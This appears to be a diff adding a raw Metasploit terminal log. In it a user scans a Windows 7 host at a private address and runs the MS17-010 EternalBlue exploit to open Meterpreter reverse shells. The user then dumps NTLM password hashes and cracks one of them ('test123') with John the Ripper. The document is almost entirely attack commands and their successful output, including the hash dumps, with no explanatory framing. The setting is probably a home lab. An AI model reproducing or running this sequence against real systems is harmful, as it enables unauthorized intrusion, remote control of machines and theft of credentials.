@@ -1,0 +1,688 @@
+┌──(kali㉿kali)-[~]
+└─$ nmap 172.20.10.3
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-08 04:56 EDT
+Nmap scan report for 172.20.10.3
+Host is up (0.0032s latency).
+Not shown: 988 closed tcp ports (conn-refused)
+PORT      STATE SERVICE
+21/tcp    open  ftp
+23/tcp    open  telnet
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+445/tcp   open  microsoft-ds
+5357/tcp  open  wsdapi
+49152/tcp open  unknown
+49153/tcp open  unknown
+49154/tcp open  unknown
+49155/tcp open  unknown
+49156/tcp open  unknown
+49157/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 1.35 seconds
+                                                                                                  
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: Display the Framework log using the log command, learn 
+more with help log
+                                                  
+
+         .                                         .                                              
+ .                                                                                                
+                                                                                                  
+      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o                                 
+       '   dB'                     BBP                                                            
+    dB'dB'dB' dBBP     dBP     dBP BB                                                             
+   dB'dB'dB' dBP      dBP     dBP  BB                                                             
+  dB'dB'dB' dBBBBP   dBP     dBBBBBBB                                                             
+                                                                                                  
+                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP                   
+          .                  .                  dB' dBP    dB'.BP                                 
+                             |       dBP    dBBBB' dBP    dB'.BP dBP    dBP                       
+                           --o--    dBP    dBP    dBP    dB'.BP dBP    dBP                        
+                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP                         
+                                                                                                  
+                                                                    .                             
+                .                                                                                 
+        o                  To boldly go where no                                                  
+                            shell has gone before                                                 
+                                                                                                  
+
+       =[ metasploit v6.4.9-dev                           ]
++ -- --=[ 2420 exploits - 1248 auxiliary - 423 post       ]
++ -- --=[ 1468 payloads - 47 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search vsftp
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
+   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor                                                                                      
+
+msf6 > use 1
+[*] No payload configured, defaulting to cmd/unix/interact
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][.
+                                       ..]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/
+                                       using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhost 172.20.10.3
+rhost => 172.20.10.3
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][.
+                                       ..]
+   RHOSTS   172.20.10.3      yes       The target host(s), see https://docs.metasploit.com/docs/
+                                       using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][.
+                                       ..]
+   RHOSTS   172.20.10.3      yes       The target host(s), see https://docs.metasploit.com/docs/
+                                       using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options
+
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][.
+                                       ..]
+   RHOSTS   172.20.10.3      yes       The target host(s), see https://docs.metasploit.com/docs/
+                                       using-metasploit/basics/using-metasploit.html
+   RPORT    21               yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
+
+[*] 172.20.10.3:21 - Banner: 220 Microsoft FTP Service
+[*] 172.20.10.3:21 - USER: 331 Password required for jvC:).
+[*] Exploit completed, but no session was created.
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set chost eth0
+[-] The following options failed to validate: Value 'eth0' is not valid for option 'CHOST'.
+chost => 
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > search eternal
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution                  
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce                                                                                
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use 2
+[*] Additionally setting TARGET => Windows 7
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com
+                                             /docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentica
+                                             tion. Only affects Windows Server 2008 R2, Windows
+                                             7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
+                                             . Only affects Windows Server 2008 R2, Windows 7, W
+                                             indows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only aff
+                                             ects Windows Server 2008 R2, Windows 7, Windows Emb
+                                             edded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
+                                        )
+   LHOST     172.20.10.4      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows 7
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > ip addr
+[*] exec: ip addr
+
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:d2:26:79 brd ff:ff:ff:ff:ff:ff
+    inet 172.20.10.4/28 brd 172.20.10.15 scope global dynamic noprefixroute eth0
+       valid_lft 85979sec preferred_lft 85979sec
+    inet6 fe80::a2fd:902d:c46b:9826/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS                          yes       The target host(s), see https://docs.metasploit.com
+                                             /docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentica
+                                             tion. Only affects Windows Server 2008 R2, Windows
+                                             7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
+                                             . Only affects Windows Server 2008 R2, Windows 7, W
+                                             indows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only aff
+                                             ects Windows Server 2008 R2, Windows 7, Windows Emb
+                                             edded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
+                                        )
+   LHOST     172.20.10.4      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows 7
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set 172.20.10.3
+[-] Unknown datastore option: 172.20.10.3.
+Usage: set [options] [name] [value]
+
+Set the given option to value.  If value is omitted, print the current value.
+If both are omitted, print options that are currently set.
+
+If run from a module context, this will set the value in the module's
+datastore.  Use -g to operate on the global datastore.
+
+If setting a PAYLOAD, this command can take an index from `show payloads'.
+
+OPTIONS:
+
+    -c, --clear   Clear the values, explicitly setting to nil (default)
+    -g, --global  Operate on global datastore variables
+    -h, --help    Help banner.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 172.20.10.3
+rhost => 172.20.10.3
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 172.20.10.4:4444 
+[*] 172.20.10.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 172.20.10.3:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
+[*] 172.20.10.3:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 172.20.10.3:445 - The target is vulnerable.
+[*] 172.20.10.3:445 - Connecting to target for exploitation.
+[+] 172.20.10.3:445 - Connection established for exploitation.
+[+] 172.20.10.3:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 172.20.10.3:445 - CORE raw buffer dump (38 bytes)
+[*] 172.20.10.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 172.20.10.3:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+[*] 172.20.10.3:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
+[+] 172.20.10.3:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 172.20.10.3:445 - Trying exploit with 12 Groom Allocations.
+[*] 172.20.10.3:445 - Sending all but last fragment of exploit packet
+[*] 172.20.10.3:445 - Starting non-paged pool grooming
+[+] 172.20.10.3:445 - Sending SMBv2 buffers
+[+] 172.20.10.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 172.20.10.3:445 - Sending final SMBv2 buffers.
+[*] 172.20.10.3:445 - Sending last fragment of exploit packet!
+[*] 172.20.10.3:445 - Receiving response from exploit packet
+[+] 172.20.10.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 172.20.10.3:445 - Sending egg to corrupted connection.
+[*] 172.20.10.3:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 172.20.10.3
+[+] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (172.20.10.4:4444 -> 172.20.10.3:49159) at 2024-08-08 05:04:28 -0400
+
+meterpreter > sysinfo
+Computer        : BROW-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > sysinfo
+Computer        : BROW-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > search eternal
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
+meterpreter > search eternal
+[-] You must specify a valid file glob to search for, e.g. >search -f *.doc
+meterpreter > exit
+[*] Shutting down session: 1
+
+[*] 172.20.10.3 - Meterpreter session 1 closed.  Reason: User exit
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 172.20.10.4:4444 
+[*] 172.20.10.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 172.20.10.3:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
+[*] 172.20.10.3:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 172.20.10.3:445 - The target is vulnerable.
+[*] 172.20.10.3:445 - Connecting to target for exploitation.
+[+] 172.20.10.3:445 - Connection established for exploitation.
+[+] 172.20.10.3:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 172.20.10.3:445 - CORE raw buffer dump (38 bytes)
+[*] 172.20.10.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 172.20.10.3:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+[*] 172.20.10.3:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
+[+] 172.20.10.3:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 172.20.10.3:445 - Trying exploit with 12 Groom Allocations.
+[*] 172.20.10.3:445 - Sending all but last fragment of exploit packet
+[*] 172.20.10.3:445 - Starting non-paged pool grooming
+[+] 172.20.10.3:445 - Sending SMBv2 buffers
+[+] 172.20.10.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 172.20.10.3:445 - Sending final SMBv2 buffers.
+[*] 172.20.10.3:445 - Sending last fragment of exploit packet!
+[*] 172.20.10.3:445 - Receiving response from exploit packet
+[+] 172.20.10.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 172.20.10.3:445 - Sending egg to corrupted connection.
+[*] 172.20.10.3:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 172.20.10.3
+[-] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[-] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] 172.20.10.3:445 - Connecting to target for exploitation.
+[+] 172.20.10.3:445 - Connection established for exploitation.
+[+] 172.20.10.3:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 172.20.10.3:445 - CORE raw buffer dump (38 bytes)
+[*] 172.20.10.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 172.20.10.3:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+[*] 172.20.10.3:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
+[+] 172.20.10.3:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 172.20.10.3:445 - Trying exploit with 17 Groom Allocations.
+[*] 172.20.10.3:445 - Sending all but last fragment of exploit packet
+[*] Meterpreter session 2 opened (172.20.10.4:4444 -> 172.20.10.3:49160) at 2024-08-08 05:07:51 -0400
+[-] 172.20.10.3:445 - RubySMB::Error::CommunicationError: RubySMB::Error::CommunicationError
+
+meterpreter > exit
+[*] Shutting down session: 2
+
+[*] 172.20.10.3 - Meterpreter session 2 closed.  Reason: Died
+msf6 exploit(windows/smb/ms17_010_eternalblue) > session -l
+[-] Unknown command: session. Did you mean sessions? Run the help command for more details.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l
+
+Active sessions
+===============
+
+No active sessions.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[*] Started reverse TCP handler on 172.20.10.4:4444 
+[*] 172.20.10.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 172.20.10.3:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)
+[*] 172.20.10.3:445       - Scanned 1 of 1 hosts (100% complete)
+[+] 172.20.10.3:445 - The target is vulnerable.
+[*] 172.20.10.3:445 - Connecting to target for exploitation.
+[+] 172.20.10.3:445 - Connection established for exploitation.
+[+] 172.20.10.3:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 172.20.10.3:445 - CORE raw buffer dump (38 bytes)
+[*] 172.20.10.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
+[*] 172.20.10.3:445 - 0x00000010  74 65 20 37 36 30 31 20 53 65 72 76 69 63 65 20  te 7601 Service 
+[*] 172.20.10.3:445 - 0x00000020  50 61 63 6b 20 31                                Pack 1          
+[+] 172.20.10.3:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 172.20.10.3:445 - Trying exploit with 12 Groom Allocations.
+[*] 172.20.10.3:445 - Sending all but last fragment of exploit packet
+[*] 172.20.10.3:445 - Starting non-paged pool grooming
+[+] 172.20.10.3:445 - Sending SMBv2 buffers
+[+] 172.20.10.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 172.20.10.3:445 - Sending final SMBv2 buffers.
+[*] 172.20.10.3:445 - Sending last fragment of exploit packet!
+[*] 172.20.10.3:445 - Receiving response from exploit packet
+[+] 172.20.10.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 172.20.10.3:445 - Sending egg to corrupted connection.
+[*] 172.20.10.3:445 - Triggering free of corrupted buffer.
+[*] Sending stage (201798 bytes) to 172.20.10.3
+[*] Meterpreter session 3 opened (172.20.10.4:4444 -> 172.20.10.3:49161) at 2024-08-08 05:09:08 -0400
+[+] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 172.20.10.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+meterpreter > sysinfo
+Computer        : BROW-PC
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BrOw:1001:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:c225b5204c2f1d3d783f4c8fa065e148:::
+meterpreter > background
+[*] Backgrounding session 3...
+msf6 exploit(windows/smb/ms17_010_eternalblue) > john --wordlist=/usr/share/john/password.lst --format=NT //home/kali/Desktop
+[*] exec: john --wordlist=/usr/share/john/password.lst --format=NT //home/kali/Desktop
+
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+No password hashes loaded (see FAQ)
+msf6 exploit(windows/smb/ms17_010_eternalblue) > john --wordlist=/usr/share/john/password.lst --format=NT ~/Desktop/hash.txt
+[*] exec: john --wordlist=/usr/share/john/password.lst --format=NT ~/Desktop/hash.txt
+
+Using default input encoding: UTF-8
+Loaded 3 password hashes with no different salts (NT [MD4 128/128 SSE2 4x3])
+Warning: no OpenMP support for this hash type, consider --fork=2
+Press Ctrl-C to abort, or send SIGUSR1 to john process for status
+                 (Administrator)     
+test123          (BrOw)     
+2g 0:00:00:00 DONE (2024-08-08 05:16) 66.66g/s 118200p/s 118200c/s 131000C/s !@#$%..sss
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=NT" options to display all of the cracked passwords reliably
+Session completed. 
+msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/gather/hashdump 
+msf6 post(windows/gather/hashdump) > set session 3
+session => 3
+msf6 post(windows/gather/hashdump) > run
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 85e30c9d7b7b33d4f40bb9d66cc0cba1...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+
+No users with password hints on this system
+
+[*] Dumping password hashes...
+
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+BrOw:1001:aad3b435b51404eeaad3b435b51404ee:c5a237b7e9d8e708d8436b6148a25fa1:::
+HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:c225b5204c2f1d3d783f4c8fa065e148:::
+
+
+[*] Post module execution completed
+msf6 post(windows/gather/hashdump) > Interrupt: use the 'exit' command to quit
+msf6 post(windows/gather/hashdump) > use windows/smb/ms17_010_eternalblue[*] 172.20.10.3 - Meterpreter session 3 closed.  Reason: Died
+
+[*] Using configured payload windows/x64/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         172.20.10.3      yes       The target host(s), see https://docs.metasploit.com
+                                             /docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentica
+                                             tion. Only affects Windows Server 2008 R2, Windows
+                                             7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
+                                             . Only affects Windows Server 2008 R2, Windows 7, W
+                                             indows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only aff
+                                             ects Windows Server 2008 R2, Windows 7, Windows Emb
+                                             edded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
+                                        )
+   LHOST     172.20.10.4      yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows 7
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.37
+LHOST => 192.168.1.37
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[-] Handler failed to bind to 192.168.1.37:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] 172.20.10.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] 172.20.10.3:445       - Rex::HostUnreachable: The host (172.20.10.3:445) was unreachable.
+[*] 172.20.10.3:445       - Scanned 1 of 1 hosts (100% complete)
+[-] 172.20.10.3:445 - The target is not vulnerable.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[-] Handler failed to bind to 192.168.1.37:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] 172.20.10.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] 172.20.10.3:445       - Rex::HostUnreachable: The host (172.20.10.3:445) was unreachable.
+[*] 172.20.10.3:445       - Scanned 1 of 1 hosts (100% complete)
+[-] 172.20.10.3:445 - The target is not vulnerable.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhost 192.168.1.37
+rhost => 192.168.1.37
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+
+[-] Handler failed to bind to 192.168.1.37:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] 192.168.1.37:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[-] 192.168.1.37:445      - Rex::ConnectionTimeout: The connection with (192.168.1.37:445) timed out.
+[*] 192.168.1.37:445      - Scanned 1 of 1 hosts (100% complete)
+[-] 192.168.1.37:445 - The target is not vulnerable.
+[*] Exploit completed, but no session was created.
+msf6 exploit(windows/smb/ms17_010_eternalblue) > show options 
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         192.168.1.37     yes       The target host(s), see https://docs.metasploit.com
+                                             /docs/using-metasploit/basics/using-metasploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain to use for authentica
+                                             tion. Only affects Windows Server 2008 R2, Windows
+                                             7, Windows Embedded Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for the specified username
+   SMBUser                         no        (Optional) The username to authenticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target
+                                             . Only affects Windows Server 2008 R2, Windows 7, W
+                                             indows Embedded Standard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only aff
+                                             ects Windows Server 2008 R2, Windows 7, Windows Emb
+                                             edded Standard 7 target machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
+                                        )
+   LHOST     192.168.1.37     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
